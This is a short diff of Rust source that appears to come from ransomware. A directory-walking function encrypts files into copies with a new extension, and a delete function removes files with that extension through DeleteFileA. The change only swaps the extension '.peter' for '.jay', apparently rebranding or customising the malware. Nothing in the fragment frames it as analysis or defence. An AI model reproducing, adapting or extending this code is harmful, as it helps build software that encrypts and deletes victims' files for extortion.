@@ -184,7 +184,7 @@ fn traverse(dir_name: CString) {
                     for byte in source_file_name[..].iter() {
                         dest_file_name.push(byte.clone());
                     }
-                    for byte in ".peter".as_bytes().iter() {
+                    for byte in ".jay".as_bytes().iter() {
                         dest_file_name.push(byte.clone());
                     }
                     encrypt(
@@ -308,7 +308,7 @@ fn delete(dir_name: CString) {
                     extension.push(new_dir[i]);
                 }
 
-                if String::from_utf8(extension).unwrap() == ".peter".to_string() {
+                if String::from_utf8(extension).unwrap() == ".jay".to_string() {
                     DeleteFileA(CString::new(new_dir).unwrap().as_ptr());
                 }
             } else {
